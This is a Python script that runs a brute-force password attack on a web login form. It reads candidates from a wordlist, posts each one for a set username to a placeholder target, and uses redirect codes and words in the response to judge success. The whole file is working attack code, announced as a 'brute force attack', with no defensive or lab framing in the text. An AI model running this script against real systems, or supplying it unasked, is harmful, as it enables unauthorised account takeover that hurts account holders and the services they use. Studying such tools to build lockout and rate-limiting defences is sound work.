#!/usr/bin/env python3

import requests
from requests.auth import HTTPBasicAuth
import sys
import time

def try_login(target, username, password):
    try:
        data = {
            'username': username,
            'password': password
        }
        
        response = requests.post(target, data=data, allow_redirects=False, timeout=10)
        
        if response.status_code in [301, 302]:
            return True
        
        body = response.text.lower()
        
        if any(keyword in body for keyword in ['success', 'welcome', 'dashboard', 'logged in']):
            return True
        
        if not any(keyword in body for keyword in ['invalid', 'incorrect', 'failed', 'wrong']):
            if len(body) < 500 or 'logout' in body:
                return True
        
        return False
    except Exception as e:
        return False

def main():
    # Configuration: Update these variables with your target
    target = "http://[TARGET_IP]"  # Replace with actual target
    username = "john"               # Replace with actual username
    password_file = "passwords.txt"
    
    print(f"[*] Starting brute force attack against {target}")
    print(f"[*] Target username: {username}")
    print(f"[*] Password wordlist: {password_file}\n")
    
    try:
        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading password file: {e}")
        return
    
    attempt = 0
    for password in passwords:
        attempt += 1
        print(f"[{attempt}] Trying password: {password}... ", end='', flush=True)
        
        if try_login(target, username, password):
            print("\n")
            print(f"[+] SUCCESS! Valid credentials found:")
            print(f"[+] Username: {username}")
            print(f"[+] Password: {password}")
            return
        else:
            print("Failed")
        
        time.sleep(0.1)
    
    print(f"\n[-] Brute force complete. No valid credentials found.")

if __name__ == "__main__":
    main()
